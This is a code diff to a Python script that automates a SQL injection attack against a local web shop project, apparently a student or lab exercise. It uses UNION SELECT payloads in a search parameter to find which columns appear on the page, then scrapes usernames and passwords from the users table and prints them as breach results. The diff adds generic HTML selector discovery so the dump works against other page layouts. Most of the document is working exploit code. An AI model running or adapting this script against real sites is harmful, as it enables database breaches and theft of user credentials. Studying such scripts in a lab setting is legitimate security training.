@@ -4,7 +4,7 @@ import time
 import re
 
 BASE_URL = "http://localhost/CyberProject" 
-sid = "rv82jh01b0c0pq4ift362fg6vp" # CHEAT - replace with a valid session ID obtained from a successful login or the SQLi bypass
+sid = "82reb4vqs953kqhnm8ull3r0am" # CHEAT - replace with a valid session ID obtained from a successful login or the SQLi bypass
 
 #CHEAT - how do we know we need to use the products page?
 # In reality, an attacker would discover this through normal site reconnaissance
@@ -59,7 +59,10 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
 
     # Step 3: find which columns we see in the browser (meaning, in the HTML)
     visible_indices = []
-    print_step("Mapping Visible Columns", "UNION SELECT markers...", "Injecting markers and searching ONLY in visible text.")
+    column_selectors = {}  # index -> (tag_name, class_name) of the cell containing that marker
+    card_selector = None   # (tag_name, class_name) of the wrapper around one row
+
+    print_step("Mapping Visible Columns", "UNION SELECT markers...", "Injecting markers and recording the HTML element each lands in.")
 
     # [0, 1, 2, 3]
     # ['COL_1', 'COL_2', 'COL_3', 'COL_4']
@@ -73,15 +76,35 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
     res = requests.get(target_url, params={'q': payload_map}, cookies=cookies)
     # parses the HTML returned by the server into a navigable tree using BeautifulSoup
     soup = BeautifulSoup(res.text, 'html.parser')
-    page_text = soup.get_text() 
 
+    marker_elements = {}  # index -> the bs4 element holding the marker text
     for i, marker in enumerate(markers):
-        if marker in page_text:
-            visible_indices.append(i)
-            print(f"[+] Column {i+1} is VISIBLE on the page.")
+        text_node = soup.find(string=lambda s: s and marker in s)
+        if not text_node:
+            continue
+        cell = text_node.parent
+        cell_classes = cell.get('class') or []
+        cell_class = cell_classes[0] if cell_classes else None
+        visible_indices.append(i)
+        marker_elements[i] = cell
+        column_selectors[i] = (cell.name, cell_class)
+        print(f"[+] Column {i+1} is VISIBLE in <{cell.name} class='{cell_class or ''}'>")
+
+    # Find the smallest ancestor (with a class) that wraps ALL visible markers.
+    # That's the per-row container we'll iterate over in Step 5.
+    if marker_elements:
+        first_cell = next(iter(marker_elements.values()))
+        for ancestor in first_cell.parents:
+            anc_classes = ancestor.get('class') or []
+            if not anc_classes:
+                continue
+            if all((ancestor is cell) or (ancestor in cell.parents) for cell in marker_elements.values()):
+                card_selector = (ancestor.name, anc_classes[0])
+                print(f"[+] Row wrapper detected: <{ancestor.name} class='{anc_classes[0]}'>")
+                break
 
     if not visible_indices:
-        visible_indices = [1, 2] 
+        visible_indices = [1, 2]
         print("[-] No visible columns detected in text. Using defaults.")
 
     
@@ -123,24 +146,32 @@ def dump_users(target_url="http://localhost/CyberProject/products.php", session_
         target_str = ", ".join(target_cols)
         payload_users = f"ZZZ%' UNION SELECT {target_str} FROM users --"
         
-        print_step("Data Dump", payload_users, "Testing if 'article' search works with unique IDs.")
+        print_step("Data Dump", payload_users, "Reusing the selectors discovered during column mapping.")
         res = requests.get(target_url, params={'q': payload_users}, cookies=cookies)
         soup = BeautifulSoup(res.text, 'html.parser')
-        
-        # can know this after research in the HTML page
-        # עופר ונעם צריך לחשוב אם באלנו לשנות את זה
-        cards = soup.find_all('article', class_='product-card')
-        
+
+        # Use the row wrapper and cell selectors we recorded in Step 3.
+        if card_selector and name_slot in column_selectors and pass_slot in column_selectors:
+            row_tag, row_class = card_selector
+            user_cell_tag, user_cell_class = column_selectors[name_slot]
+            pass_cell_tag, pass_cell_class = column_selectors[pass_slot]
+            rows = soup.find_all(row_tag, class_=row_class)
+        else:
+            print("[-] Missing selectors from recon step; cannot extract rows.")
+            rows = []
+
         print("\n\033[1;41;37m[!!!] BREACH RESULTS:\033[0m")
-        
-        for card in cards:
-            name_div = card.find('div', class_='product-name')
-            price_div = card.find('div', class_='product-price')
-            
-            if name_div and price_div:
-                u = name_div.get_text(strip=True)
-                p = price_div.get_text(strip=True).replace('₪', '').strip()
-                
+
+        for row in rows:
+            user_cell = row.find(user_cell_tag, class_=user_cell_class)
+            pass_cell = row.find(pass_cell_tag, class_=pass_cell_class)
+
+            if user_cell and pass_cell:
+                # Strip any decorative text the template appended around the value
+                # (e.g. currency symbols, units). The attacker doesn't care what it is.
+                u = re.sub(r'[^\w@.\-]', '', user_cell.get_text(strip=True))
+                p = re.sub(r'[^\w@.\-]', '', pass_cell.get_text(strip=True))
+
                 if u and u != "NULL":
                     print(f"[*] User: {u:<15} | Password: {p}")
                     found_creds.append((u, p))
